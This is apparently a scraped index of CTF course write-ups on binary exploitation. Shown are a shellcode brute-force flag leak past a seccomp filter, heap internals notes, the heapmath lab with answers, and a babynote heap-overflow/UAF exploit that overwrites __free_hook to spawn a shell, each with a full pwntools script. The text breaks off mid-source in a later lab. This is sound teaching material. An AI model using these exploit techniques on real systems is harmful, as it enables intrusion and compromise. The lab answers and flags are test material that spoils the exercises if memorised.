sys_number 0003: 0x35 0x00 0x01 0x40000000 if (A \u0026lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x03 0xffffffff if (A != 0xffffffff) goto 0008 0005: 0x15 0x01 0x00 0x0000003c if (A == exit) goto 0007 0006: 0x15 0x00 0x01 0x000000e7 if (A != exit_group) goto 0008 0007: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0008: 0x06 0x00 0x00 0x00000000 return KILL Note that, if you want to use seccomp-tools, you should modify /home/chal/flag to ./flag It just allow exit function Description \u0026amp; Preliminary idea # At line 16, it create a writable, readable and executable space with size 0x1000 And it read the flag to global variable without buffer overflow Then it allow us to write something to addr memory space In addition, turn on seccomp rules to protect itself MOST IMPORTANT AT LINE 35: it\u0026rsquo;ll call addr as function So, the preliminary idea is to put some instructions to addr and it\u0026rsquo;ll execute at line 35 Exploit - brute force + assembly instruction # Observe register and try to leak flag info.\n$ gdb chal \u0026gt;pwndbg b main \u0026gt;pwndbg r \u0026gt;pwndbg b *main+337 \u0026gt;pwndbg c We can see that in $r13 store 0x555555555289 (main) ◂— endbr64 and we can aware of the truly address of variable flag by using vmmap.\npwndbg\u0026gt; vmmap pwndbg\u0026gt; x/100s 0x555555558000 ... 0x555555558040 \u0026lt;flag\u0026gt;: \u0026#34;FLAG{test_1235s456fasdjknisjsdfkl45641233f1234}\\n\u0026#34; ... So, we can knew the distance of these two address is 0x2db7\n\u0026gt;\u0026gt;\u0026gt; hex(0x555555558040-0x555555555289) \u0026#39;0x2db7\u0026#39; exploit: move the first 8 bytes to $rax\nmov r10, r13 add r10, 0x2db7 mov rax, [r10] Note that, if you\u0026rsquo;d like to move next 8 bytes to $rax, rewrite [r10] to [r10+0x8] Compare the single char by brute force If the result of comparison is correct, the system will call sys_exit with error_code=0, otherwise, access to infinity loop. We start from 0x20 on ascii table and end at 0x80 Especially, when the comparison is correct, we have to shift $rax with 8 bits and start to compare next single char\nmov cl, \u0026#39;\u0026#39;\u0026#39; + str(guess) + \u0026#39;\u0026#39;\u0026#39; shr rax, \u0026#39;\u0026#39;\u0026#39; + str(8*shift_count) + \u0026#39;\u0026#39;\u0026#39; Compare: cmp al, cl je the_same infinity1: jmp infinity1 the_same: mov rax, 0x3c mov rdi, 0 syscall Send the shellcode to addr global variable The trickiest things is you must add \\x00 at the end of received strings and the reason is for the control flow next.\nr.sendafter(b\u0026#34;code\\n\\x00\u0026#34;, shellcode) How to know the single char in pwntool side? If compare correct, the program will exit directly and pwntools will trigger timeout function and do the exception, at the same time, we can clearly aware of the what is the current single char is, otherwise, the guess will increase and do the next comparison.\ntry : # If compare not correct, guess++ and access to infinity loop r.recv(timeout=0.2) print(\u0026#39;not the same\u0026#39;) guess += 1 except: # If compare correct, pwntool will break out print(\u0026#39;the same\u0026#39;) break r.close() Repeat shift_count can not over 7 is because the biggest size that $rax can store is 8 bytes\nflag = \u0026#39;\u0026#39; shift_count = 0 while shift_count \u0026lt; 8: guess = 0x20 while guess \u0026lt; 0x80 : {create shellcode} {send shellcode} try: ... except: ... r.close() shift_count += 1 flag += chr(guess) print(flag) r.interactive() Whole exploit :::spoiler code from pwn import * # r = process(\u0026#39;./chal\u0026#39;) context.arch = \u0026#39;amd64\u0026#39; flag = \u0026#39;\u0026#39; shift_count = 0 while shift_count \u0026lt; 8: guess = 0x20 while guess \u0026lt; 0x80 : # r = process(\u0026#39;./chal\u0026#39;) r = remote(\u0026#39;edu-ctf.zoolab.org\u0026#39;,10002) shellcode = asm(\u0026#39;\u0026#39;\u0026#39; mov r10, r13 add r10, 0x2db7 mov rax, [r10] mov cl, \u0026#39;\u0026#39;\u0026#39; + str(guess) + \u0026#39;\u0026#39;\u0026#39; shr rax, \u0026#39;\u0026#39;\u0026#39; + str(8*shift_count) + \u0026#39;\u0026#39;\u0026#39; Compare: cmp al, cl je the_same infinity1: jmp infinity1 the_same: mov rax, 0x3c mov rdi, 0 syscall \u0026#39;\u0026#39;\u0026#39;) # raw_input() r.sendafter(b\u0026#34;code\\n\\x00\u0026#34;, shellcode) try : # If compare not correct, guess++ and access to infinity loop r.recv(timeout=0.2) print(\u0026#39;not the same\u0026#39;) guess += 1 except: # If compare correct, pwntool will break out print(\u0026#39;the same\u0026#39;) break # raw_input() r.close() shift_count += 1 flag += chr(guess) print(flag) r.interactive() ::: Note that: I create 6 multi-threads to execute the exploit program simultaneously with a little bit difference 1st thread: mov rax, [r10] output:FLAG{pia 2nd thread: mov rax, [r10+0x8] output:no_d113f 3rd thread: mov rax, [r10+0x10] output:1c3f9ed8 4th thread: mov rax, [r10+0x18] output:019288f4 5th thread: mov rax, [r10+0x20] output:e8ddecfb 6th thread: mov rax, [r10+0x28] output:8ec} FLAG{piano_d113f1c3f9ed8019288f4e8ddecfb8ec} Reference # linux 中mmap的用法\n"},{"id":382,"href":"/security/course/ntu-cs/pwn/simple-pwn---0x14simple-heap/","title":"Simple PWN - 0x14(Simple HEAP)","section":"Securities","content":" Simple PWN - 0x14(Simple HEAP) # tags: CTF PWN eductf # Version: Ubuntu 20.04\nHEAP background # Advanced Binary Exploitation (Pwn) - Heap Exploitation SS111-Pwn2\nAllocate a memory # Original Code # #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int main() { void *ptr; ptr = malloc(0x30); return 0; } $ sudo gcc -o simple_heap simple_heap.c -no-pie Analyze # Before executing malloc, there is no heap space in memory layout After\u0026hellip; And the size is 0x21000 that is 135168 bytes = 132 kB → main arena(大餅乾)\nmain arena DON\u0026rsquo;T BE PANIC!!! We have useful tool to parse it automatically → pwngdb from AngelBoy How about if we free the memory? # Original Code # #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int main() { void *ptr; ptr = malloc(0x30); free(ptr) return 0; } Note that 0x30is for Tcache bin size Analyze # Before freeing memory, we can observe the memory that system gave to us. The structure and meaning is as below. Header said we have no previous chunk(the first 8 bytes is 0x0) and the size of current chunk is 0x40. In addition, the last byte is 0001 means p flag is 1. Moreover, the data section told us that the system actually gave us a memory with size 0x30 After freeing\u0026hellip;You can see that 0x40 has an address that we just free How about we malloc another 0x30 and free it later? # Original Code # #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int main() { void *ptr, *ptr2; ptr = malloc(0x30); ptr2 = malloc(0x30); free(ptr2); free(ptr); return 0; } Analyze # After malloc, before free After free\u0026hellip;, it\u0026rsquo;s a singly linked list(單向linked list) Observe the memory we free, the metadata of ptr point to the initial data section of ptr2 In addition, the PREV_INUSE bit will maintain 1 even the previous chunk is free. tcache_entry # Refer to lecture - SS111-Pwn2 So, we can use heap to check the situation In addition, tcache_entry will point to the data section instead of header like other bin Reference # Advanced Binary Exploitation (Pwn) - Heap Exploitation\n"},{"id":383,"href":"/security/course/ntu-cs/pwn/simple-pwn---0x15lab---heapmath/","title":"Simple PWN - 0x15(Lab - `heapmath`)","section":"Securities","content":" Simple PWN - 0x15(Lab - heapmath) # tags: CTF PWN eductf # Version: Ubuntu 20.04\nOriginal Code # :::spoiler code\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;time.h\u0026gt; int main() { setvbuf(stdin, 0, _IONBF, 0); setvbuf(stdout, 0, _IONBF, 0); srand(time(NULL)); void *tcache_chk[7] = {0}; unsigned char tcachebin[3][7] = {0}; // 0x20, 0x30, 0x40 unsigned int tcachebin_counts[4] = {0}; unsigned long tcache_size[7] = {0}; unsigned long tcache_free_order[7] = {0}; puts(\u0026#34;----------- ** tcache chall ** -----------\u0026#34;); unsigned long tmp = 0; for (int i = 0; i \u0026lt; 7; i++) { tmp = (rand() % 0x21) + 0x10; // 0x10 ~ 0x30 tcache_size[i] = tmp; } for (int i = 0; i \u0026lt; 7; i++) { repeat: tmp = rand() % 7; for (int j = 0; j \u0026lt; i; j++) if (tmp == tcache_free_order[j]) goto repeat; tcache_free_order[i] = tmp; } for (int i = 0; i \u0026lt; 7; i++) { tcache_chk[i] = malloc( tcache_size[i] ); printf(\u0026#34;char *%c = (char *) malloc(0x%lx);\\n\u0026#34;, \u0026#39;A\u0026#39; + i, tcache_size[i]); } for (int i = 0; i \u0026lt; 7; i++) { int idx = tcache_free_order[i]; free(tcache_chk[ idx ]); printf(\u0026#34;free(%c);\\n\u0026#34;, \u0026#39;A\u0026#39; + (unsigned char) idx); tmp = tcache_size[ idx ] - 0x8; if (tmp % 0x10) tmp = (tmp \u0026amp; ~0xf) + 0x20; else tmp += 0x10; unsigned int binidx = ((tmp - 0x20) / 0x10); unsigned int bincnt = tcachebin_counts[ binidx ]; tcachebin[ binidx ][ bincnt ] = \u0026#39;A\u0026#39; + (unsigned char) idx; tcachebin_counts[ binidx ]++; } char tmpbuf[0x100] = {0}; char ansbuf[3][0x100] = {0}; for (int i = 0; i \u0026lt; 3; i++) { for (int j = 6; j \u0026gt;= 0; j--) if (tcachebin[i][j]) { sprintf(tmpbuf, \u0026#34;%c --\u0026gt; \u0026#34;, tcachebin[i][j]); strcat(ansbuf[i], tmpbuf); } strcat(ansbuf[i], \u0026#34;NULL\u0026#34;); } puts(\u0026#34;\u0026#34;); for (int i = 0; i \u0026lt; 3; i++) { printf(\u0026#34;[chunk size] 0x%x: \u0026#34;, (i+2) * 0x10); if (i == 0) { printf(\u0026#34;%s\\t(just send \\\u0026#34;%s\\\u0026#34;)\\n\u0026#34;, ansbuf[i], ansbuf[i]); } else { printf(\u0026#34;?\\n\u0026gt; \u0026#34;); fgets(tmpbuf, 0x100, stdin); if (!strncmp(tmpbuf, ansbuf[i], strlen(ansbuf[i]))) { puts(\u0026#34;Correct !\u0026#34;); } else { puts(\u0026#34;Wrong !\u0026#34;); printf(\u0026#34;Ans: \\\u0026#34;%s\\\u0026#34;\\n\u0026#34;, ansbuf[i]); exit(0); } } } puts(\u0026#34;\\n----------- ** address chall ** -----------\u0026#34;); int cmp1 = 0; int cmp2 = 0; unsigned long ans_addr = 0; cmp1 = rand() % 7; while ((cmp2 = rand() % 7) == cmp1); if (cmp1 \u0026gt; cmp2) { tmp = cmp1; cmp1 = cmp2; cmp2 = tmp; } printf(\u0026#34;assert( %c == %p );\\n\u0026#34;, \u0026#39;A\u0026#39; + cmp1, tcache_chk[ cmp1 ]); printf(\u0026#34;%c == ?\\t(send as hex format, e.g. \\\u0026#34;%p\\\u0026#34;)\\n\u0026gt; \u0026#34;, \u0026#39;A\u0026#39; + cmp2, tcache_chk[ cmp1 ]); scanf(\u0026#34;%s\u0026#34;, tmpbuf); ans_addr = strtoul(tmpbuf, NULL, 16); if (ans_addr == (unsigned long) tcache_chk[ cmp2 ]) { puts(\u0026#34;Correct !\u0026#34;); } else { puts(\u0026#34;Wrong !\u0026#34;); printf(\u0026#34;Ans: %p\\n\u0026#34;, tcache_chk[ cmp2 ]); exit(0); } puts(\u0026#34;\\n----------- ** index chall ** -----------\u0026#34;); unsigned long *fastbin[2] = {0}; unsigned long fastbin_size = 0; unsigned long secret_idx = 0, result_idx = 0, res = 0; fastbin_size = (rand() % 0x31) + 0x40; // 0x40 ~ 0x70 fastbin_size \u0026amp;= ~0xf; fastbin[0] = (unsigned long *) malloc( fastbin_size ); fastbin[1] = (unsigned long *) malloc( fastbin_size ); printf(\u0026#34;unsigned long *%c = (unsigned long *) malloc(0x%lx);\\n\u0026#34;, \u0026#39;X\u0026#39;, fastbin_size); printf(\u0026#34;unsigned long *%c = (unsigned long *) malloc(0x%lx);\\n\u0026#34;, \u0026#39;Y\u0026#39;, fastbin_size); secret_idx = rand() % (fastbin_size / 8); fastbin[1][ secret_idx ] = 0xdeadbeef; result_idx = ((unsigned long)(\u0026amp;fastbin[1][ secret_idx ]) - (unsigned long)(\u0026amp;fastbin[0][0])) / 8; printf(\u0026#34;Y[%lu] = 0xdeadbeef;\\n\u0026#34;, secret_idx); printf(\u0026#34;X[?] == 0xdeadbeef\\t(just send an integer, e.g. \\\u0026#34;8\\\u0026#34;)\\n\u0026gt; \u0026#34;); scanf(\u0026#34;%lu\u0026#34;, \u0026amp;res); if (fastbin[0][res] == 0xdeadbeef) { puts(\u0026#34;Correct !\u0026#34;); } else { puts(\u0026#34;Wrong !\u0026#34;); printf(\u0026#34;Ans: %lu\\n\u0026#34;, result_idx); exit(0); } puts(\u0026#34;\\n----------- ** tcache fd chall ** -----------\u0026#34;); free(fastbin[0]); free(fastbin[1]); printf(\u0026#34;free(X);\\nfree(Y);\\nassert( Y == %p );\\n\u0026#34;, fastbin[1]); printf(\u0026#34;fd of Y == ?\\t(send as hex format, e.g. \\\u0026#34;%p\\\u0026#34;)\\n\u0026gt; \u0026#34;, fastbin[1]); scanf(\u0026#34;%s\u0026#34;, tmpbuf); ans_addr = strtoul(tmpbuf, NULL, 16); if (ans_addr == *fastbin[1]) { puts(\u0026#34;Correct !\u0026#34;); } else { puts(\u0026#34;Wrong !\u0026#34;); printf(\u0026#34;Ans: 0x%lx\\n\u0026#34;, *fastbin[1]); exit(0); } puts(\u0026#34;\\n----------- ** fastbin fd chall (final) ** -----------\u0026#34;); puts(\u0026#34;[*] Restore the chunk to X and Y\u0026#34;); printf(\u0026#34;%c = (unsigned long *) malloc(0x%lx);\\n\u0026#34;, \u0026#39;Y\u0026#39;, fastbin_size); printf(\u0026#34;%c = (unsigned long *) malloc(0x%lx);\\n\u0026#34;, \u0026#39;X\u0026#39;, fastbin_size); fastbin[1] = malloc(fastbin_size); fastbin[0] = malloc(fastbin_size); printf(\u0026#34;[*] Do something to fill up 0x%lx tcache\\n...\\n[*] finish\\n\u0026#34;, fastbin_size + 0x10); void *tmpchk[7]; for (int i = 0; i \u0026lt; 7; i++) tmpchk[i] = malloc(fastbin_size); for (int i = 0; i \u0026lt; 7; i++) free(tmpchk[i]); printf(\u0026#34;free(X);\\nfree(Y);\\nassert( Y == %p );\\n\u0026#34;, fastbin[1]); free(fastbin[0]); free(fastbin[1]); printf(\u0026#34;fd of Y == ?\\t(send as hex format, e.g. \\\u0026#34;%p\\\u0026#34;)\\n\u0026gt; \u0026#34;, fastbin[1]); scanf(\u0026#34;%s\u0026#34;, tmpbuf); ans_addr = strtoul(tmpbuf, NULL, 16); if (ans_addr == *fastbin[1]) { puts(\u0026#34;Correct !\u0026#34;); memset(tmpbuf, 0, 0x31); int fd = open(\u0026#34;/home/heapmath/flag\u0026#34;, O_RDONLY); read(fd, tmpbuf, 0x30); close(fd); printf(\u0026#34;Here is your flag: %s\\n\u0026#34;, tmpbuf); } else { puts(\u0026#34;Wrong !\u0026#34;); printf(\u0026#34;Ans: 0x%lx\\n\u0026#34;, *fastbin[1]); exit(0); } } :::\nIt\u0026rsquo;s a test of tcache and fastbin background, therefore, just execute it directly!!! Questions # ----------- ** tcache chall ** ----------- char *A = (char *) malloc(0x12); char *B = (char *) malloc(0x30); char *C = (char *) malloc(0x13); char *D = (char *) malloc(0x23); char *E = (char *) malloc(0x20); char *F = (char *) malloc(0x28); char *G = (char *) malloc(0x13); free(B); free(A); free(F); free(C); free(D); free(G); free(E); [chunk size] 0x20: G --\u0026gt; C --\u0026gt; A --\u0026gt; NULL (just send \u0026#34;G --\u0026gt; C --\u0026gt; A --\u0026gt; NULL\u0026#34;) [chunk size] 0x30: ? [chunk size] 0x40: ? Sol. First, try to compute every char malloc size A → $align(0x12 - 0x8 + 0x10) = 0x20$ B → $align(0x30 - 0x8 + 0x10) = 0x40$ C → $align(0x13 - 0x8 + 0x10) = 0x20$ D → $align(0x23 - 0x8 + 0x10) = 0x30$ E → $align(0x20 - 0x8 + 0x10) = 0x30$ F → $align(0x28 - 0x8 + 0x10) = 0x30$ G → $align(0x13 - 0x8 + 0x10) = 0x20$\nThen, the sequence of the free char is B→A→F→C→D→G→E, according to FILO ruls(stack) The sequence of 0x30: E \u0026ndash;\u0026gt; D \u0026ndash;\u0026gt; F \u0026ndash;\u0026gt; NULL The sequence of 0x30: B \u0026ndash;\u0026gt; NULL ----------- ** address chall ** ----------- assert( A == 0x563d3e2b72a0 ); F == ? (send as hex format, e.g. \u0026#34;0x563d3e2b72a0\u0026#34;) Sol. Just accumulate the size A == 0x563d3e2b72a0 B == A + 0x20 == 0x563d3e2b72c0 C == B + 0x40 == 0x563d3e2b7300 D == C + 0x20 == 0x563d3e2b7320 E == D + 0x30 == 0x563d3e2b7350 F == E + 0x30 == 0x563d3e2b7380 G == F + 0x30 == 0x563d3e2b73b0\n----------- ** index chall ** ----------- unsigned long *X = (unsigned long *) malloc(0x60); unsigned long *Y = (unsigned long *) malloc(0x60); Y[8] = 0xdeadbeef; X[?] == 0xdeadbeef (just send an integer, e.g. \u0026#34;8\u0026#34;) Sol. X has $align(0x60 - 0x8 + 0x10) = 0x70$ size of malloc address Y has $align(0x60 - 0x8 + 0x10) = 0x70$ size of malloc address In addition these two memory are connected together Thus, X has 7*2=14 8 bytes and 0xdeadbeef is at the 4th position of Y Therefore, the answer is $14+8=22$ ----------- ** tcache fd chall ** ----------- free(X); free(Y); assert( Y == 0x563d3e2b7440 ); fd of Y == ? (send as hex format, e.g. \u0026#34;0x563d3e2b7440\u0026#34;) Sol. Just minus the size of Y From the last question, we can know that the memory space of X and Y are connected together, in addition, the fd of Y point to X's data section Thus, the answer is $0x563d3e2b7440 - 0x10 - 0x60 = 0x563d3e2b73d0$\n----------- ** fastbin fd chall (final) ** ----------- [*] Restore the chunk to X and Y Y = (unsigned long *) malloc(0x60); X = (unsigned long *) malloc(0x60); [*] Do something to fill up 0x70 tcache ... [*] finish free(X); free(Y); assert( Y == 0x563d3e2b7440 ); fd of Y == ? (send as hex format, e.g. \u0026#34;0x563d3e2b7440\u0026#34;) Sol. When tcache is full, the free chunk will be put into other bin, such as fastbin. According to the lecture description of fastbin structure, the answer is $0x563d3e2b7440 - 0x10 - 0x70 = 0x563d3e2b73c0$ Reference # SS111-Pwn2\n"},{"id":384,"href":"/security/course/ntu-cs/pwn/simple-pwn-0x16simple_smallbin/","title":"Simple PWN 0x16(simple_smallbin)","section":"Securities","content":" Simple PWN 0x16(simple_smallbin) # tags: CTF PWN eductf # Version: Ubuntu 20.04\nBackground # Original Code # :::spoiler code\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int main() { void *ptrs[7]; void *smallbin; int i; for (i = 0; i \u0026lt; 7; i++) ptrs[i] = malloc(0x108); // 0x110 chunk size smallbin = malloc(0x108); malloc(0x18); // aim to fill up tcache while(i) free(ptrs[--i]); free(smallbin); // trigger unsorted bin dispatch malloc(0x870); return 0; } :::\nDescription \u0026amp; Analyze # First things first, the program will call malloc to get 0x108*8(0x110 chunk size) Then free the all chunks When tcache is fill and chunk size \u0026gt; 0x80, it\u0026rsquo;ll be put into Unsorted bin And now, if we malloc a new space with size equal 0x870 According to the flow chart, when the malloc size over 0x410, it\u0026rsquo;ll find Unsorted bin first, and now, Unsorted bin has no suitable chunk, thus find large bin further. Unfortunately, it still has no suitable chunk for the user, split the memory from top chunk \u0026gt;pwndbg heap ... Allocated chunk | PREV_INUSE Addr: 0x555555559b30 Size: 0x881 Top chunk | PREV_INUSE Addr: 0x55555555a3b0 Size: 0x1fc51 Note that, the interesting thing is when we free smallbin, the process put it in Unsorted bin. And when we malloc 0x870, the process found that Unsorted bin has no suitable chunk for the user, then it\u0026rsquo;ll put smallbin(0x110) to where it should be → smallbins Before malloc 0x870 and after free smallbin(0x110) After malloc 0x870 "},{"id":385,"href":"/security/course/ntu-cs/pwn/simple-pwn-0x17uaf---leak-information/","title":"Simple PWN 0x17(UAF - leak information)","section":"Securities","content":" Simple PWN 0x17(UAF - leak information) # tags: CTF PWN eductf # Version: Ubuntu 20.04\nUAF backgroud # SS111-Pwn2 Advanced Binary Exploitation (Pwn) - Heap Exploitation Original Code # #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int main() { void *p1, *p2; p1 = malloc(0x30); p2 = malloc(0x30); free(p1); free(p2); puts(p2); } If we set the pointer to NULL after it was freed, then we can get some vital info. from this chunk.\nAnalyze # After malloc all pointer After free p1 After free p2, the data section will transfer to store metadata, and fd store the address of p1 header Thus, we print out the value of p2, we will leak something if it wasn\u0026rsquo;t set NULL after it was freed "},{"id":386,"href":"/security/course/ntu-cs/pwn/simple-pwn-0x18lab---babynote/","title":"Simple PWN 0x18(Lab - `babynote`)","section":"Securities","content":" Simple PWN 0x18(Lab - babynote) # tags: CTF PWN eductf # Version: Ubuntu 20.04\nBackground # hook - SS111-Pwn2 Hook簡介 Hook Function (攔截函式) The process of free and priority Assume we malloc a memory with size over 0x410, then when we free it, it\u0026rsquo;ll be classified to Unsorted bin instead of tcache Original Code # :::spoiler code\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; struct Note { char name[0x10]; void *data; }; struct Note *notes[0x10]; static short int get_idx() { short int idx; printf(\u0026#34;index\\n\u0026gt; \u0026#34;); scanf(\u0026#34;%hu\u0026#34;, \u0026amp;idx); if (idx \u0026gt;= 0x10) printf(\u0026#34;no, no ...\\n\u0026#34;), exit(1); return idx; } static short int get_size() { short int size; printf(\u0026#34;size\\n\u0026gt; \u0026#34;); scanf(\u0026#34;%hu\u0026#34;, \u0026amp;size); return size; } void add_note() { short int idx; idx = get_idx(); notes[idx] = malloc(sizeof(*notes[idx])); printf(\u0026#34;note name\\n\u0026gt; \u0026#34;); read(0, notes[idx]-\u0026gt;name, 0x10); notes[idx]-\u0026gt;data = NULL; printf(\u0026#34;success!\\n\u0026#34;); } void edit_data() { short int idx; short int size; idx = get_idx(); size = get_size(); if (notes[idx]-\u0026gt;data == NULL) notes[idx]-\u0026gt;data = malloc(size); read(0, notes[idx]-\u0026gt;data, size); printf(\u0026#34;success!\\n\u0026#34;); } void del_note() { short int idx; idx = get_idx(); free(notes[idx]-\u0026gt;data); free(notes[idx]); printf(\u0026#34;success!\\n\u0026#34;); } void show_notes() { for (int i = 0; i \u0026lt; 0x10; i++) { if (notes[i] == NULL || notes[i]-\u0026gt;data == NULL) continue; printf(\u0026#34;[%d] %s\\ndata: %s\\n\u0026#34;, i, notes[i]-\u0026gt;name, (char *)notes[i]-\u0026gt;data); } } int main() { char opt[2]; setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stdout, NULL, _IONBF, 0); while (1) { printf(\u0026#34;1. add_note\\n\u0026#34; \u0026#34;2. edit_data\\n\u0026#34; \u0026#34;3. del_note\\n\u0026#34; \u0026#34;4. show_notes\\n\u0026#34; \u0026#34;5. bye\\n\u0026#34; \u0026#34;\u0026gt; \u0026#34;); read(0, opt, 2); switch (opt[0]) { case \u0026#39;1\u0026#39;: add_note(); break; case \u0026#39;2\u0026#39;: edit_data(); break; case \u0026#39;3\u0026#39;: del_note(); break; case \u0026#39;4\u0026#39;: show_notes(); break; case \u0026#39;5\u0026#39;: exit(0); } } return 0; } :::\nDescription # The data structure is as below, we can use add_note to create a new note and use edit_note to add/modify the data of note. Or just delete specific note or use show_note to print all of them. Something Wrong # edit_note has heap overflow So that we can add 2 notes and use edit function to overlap the 2nd notes.\nadd_note(0, b\u0026#39;a\u0026#39;*8) edit_note(0, 0xa, b\u0026#39;a\u0026#39;) add_note(1, b\u0026#39;b\u0026#39;*8) edit_note(1, 0x30, b\u0026#39;a\u0026#39;*48) #\u0026lt;-- overlap Before overlap After overlap used after free(UAF) It has not deleted the pointer when it was freed\nvoid del_note() { short int idx; idx = get_idx(); free(notes[idx]-\u0026gt;data); free(notes[idx]); printf(\u0026#34;success!\\n\u0026#34;); } Preliminary Idea # Based on the problem we found above, we can try to use __free_hook to execute system('/bin/sh')\nExploit - UAF + heap overflow + __free_hook # Try to construct heap structure that we need\nadd_note(0, b\u0026#39;a\u0026#39;*8) # index 0 edit_note(0, 0x418, b\u0026#39;a\u0026#39;) add_note(1, b\u0026#39;b\u0026#39;*8) # index 1 edit_note(1, 0x18, b\u0026#39;b\u0026#39;) add_note(2, b\u0026#39;c\u0026#39;*8) # index 2 index 0 is for leaking the address of libc index 1 is to implement heap overflow index 2 is a fake chunk that we have to construct Leak libc address and find __free_hook, __libc_system\nThe reason that we set the data size of index 0 be 0x418(1048 in decimal) is because when we free it, it will be classified to Unsorted bin and the fd and bk will store the address of libc Then we have to find where is __libc_system and __free_hook\npwndbg\u0026gt; p __libc_system $1 = {int (const char *)} 0x7f9614bac290 \u0026lt;__libc_system\u0026gt; pwndbg\u0026gt; p \u0026amp;__free_hook $2 = (void (**)(void *, const void *)) 0x7f9614d48e48 \u0026lt;__free_hook\u0026gt; The offset is Unsorted bin fd: $0x7f9614d46be0 - 0x7f9614b5a000 = 0x1ecbe0$ __libc_system: $0x7f9614bac290 - 0x7f9614b5a000 = 0x52290$ __free_hook: $0x7f9614d48e48 - 0x7f9614b5a000 = 0x1eee48$\nSo, we delete index 0 first, and try to use show_note function to receive the Unsorted bin fd\ndelete_note(0) show_note() r.recvuntil(b\u0026#39;data:\u0026#39;) libc = (u64(r.recv(8)) \u0026gt;\u0026gt; 8) - 0x1ecbe0 - 0xa000000000000 info(f\u0026#34;libc address: {hex(libc)}\u0026#34;) free_hook_addr = libc + 0x1eee48 info(f\u0026#34;__free_hook address: {hex(free_hook_addr)}\u0026#34;) libc_sys_addr = libc + 0x52290 info(f\u0026#34;__libc_system address: {hex(libc_sys_addr)}\u0026#34;) Construct fake chunk by using heap overflow\ndata = b\u0026#39;/bin/sh\\x00\u0026#39;.ljust(0x10, b\u0026#39;b\u0026#39;) fake_chunk = flat( 0, 0x21, b\u0026#39;cccccccc\u0026#39;, b\u0026#39;cccccccc\u0026#39;, free_hook_addr ) edit_note(1, 0x38, data + fake_chunk) edit_note(2, 0x8, p64(libc_sys_addr)) Note that, the data of note structure is a pointer that point to a space that system malloc. Thus, edit_note function will modify the pointed space, so that edit_note(b'2\\n', b'8\\n', p64(libc_sys_addr)) will modify [free_hook_addr] instead of index 2. Delete index 1 and call __free_hook When we free index 1 and __free_hook is not NULL, then __free_hook can be a function pointer to execute 0x7ffbb6500290 that is __libc_system and the parameter is index 1 data, that is /bin/sh\\x00\ndelete_note(1) Well, we got shell!! Whole exploit :::spoiler code from pwn import * # r = process(\u0026#39;./chal\u0026#39;) r = remote(\u0026#39;edu-ctf.zoolab.org\u0026#39;, 10007) context.arch = \u0026#39;amd64\u0026#39; def add_note(idx, note_name): r.sendafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;1\u0026#39;) r.sendlineafter(b\u0026#39;index\\n\u0026gt; \u0026#39;, str(idx)) r.sendafter(b\u0026#39;note name\\n\u0026gt; \u0026#39;, note_name) def edit_note(idx, note_size, message): r.sendafter(b\u0026#34;\u0026gt; \u0026#34;, b\u0026#34;2\u0026#34;) r.sendlineafter(b\u0026#39;index\\n\u0026gt; \u0026#39;, str(idx)) r.sendlineafter(b\u0026#39;size\\n\u0026gt; \u0026#39;, str(note_size)) r.send(message) def delete_note(idx): r.sendafter(b\u0026#34;\u0026gt; \u0026#34;, b\u0026#34;3\u0026#34;) r.sendlineafter(b\u0026#39;index\\n\u0026gt; \u0026#39;, str(idx)) def show_note(): r.sendafter(b\u0026#34;\u0026gt; \u0026#34;, b\u0026#34;4\u0026#34;) \u0026#39;\u0026#39;\u0026#39;------------------ Construct heap memory ------------------\u0026#39;\u0026#39;\u0026#39; add_note(0, b\u0026#39;a\u0026#39;*8) edit_note(0, 0x418, b\u0026#39;a\u0026#39;) add_note(1, b\u0026#39;b\u0026#39;*8) edit_note(1, 0x18, b\u0026#39;b\u0026#39;) add_note(2, b\u0026#39;c\u0026#39;*8) \u0026#39;\u0026#39;\u0026#39;------------------ Leak libc address ------------------\u0026#39;\u0026#39;\u0026#39; delete_note(0) show_note() r.recvuntil(b\u0026#39;data:\u0026#39;) libc = (u64(r.recv(8)) \u0026gt;\u0026gt; 8) - 0x1ecbe0 - 0xa000000000000 info(f\u0026#34;libc address: {hex(libc)}\u0026#34;) free_hook_addr = libc + 0x1eee48 info(f\u0026#34;__free_hook address: {hex(free_hook_addr)}\u0026#34;) libc_sys_addr = libc + 0x52290 info(f\u0026#34;__libc_system address: {hex(libc_sys_addr)}\u0026#34;) \u0026#39;\u0026#39;\u0026#39;------------------ Construct fake chunk ------------------\u0026#39;\u0026#39;\u0026#39; data = b\u0026#39;/bin/sh\\x00\u0026#39;.ljust(0x10, b\u0026#39;b\u0026#39;) fake_chunk = flat( 0, 0x21, b\u0026#39;cccccccc\u0026#39;, b\u0026#39;cccccccc\u0026#39;, free_hook_addr ) edit_note(1, 0x38, data + fake_chunk) edit_note(2, 0x8, p64(libc_sys_addr)) delete_note(1) r.interactive() ::: Reference # SS111-Pwn2\n"},{"id":387,"href":"/security/course/ntu-cs/pwn/simple-pwn-0x19lab---babyums---flag-1/","title":"Simple PWN 0x19(Lab - `babyums` - flag 1)","section":"Securities","content":" Simple PWN 0x19(Lab - babyums - flag 1) # tags: CTF PWN eductf # Version: Ubuntu 20.04\nOriginal Code # :::spoiler Original Code\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #define FLAG1 \u0026#34;flag{XXXXXXXX}\u0026#34; struct User { char name[0x10]; char password[0x10]; void *data; }; struct User *users[8]; static short int get_idx() { short int idx; printf(\u0026#34;index\\n\u0026gt; \u0026#34;); scanf(\u0026#34;%hu\u0026#34;, \u0026amp;idx); if (idx \u0026gt;= 8) printf(\u0026#34;no, no ...\u0026#34;), exit(1); return idx; } static short int get_size() { short int size; 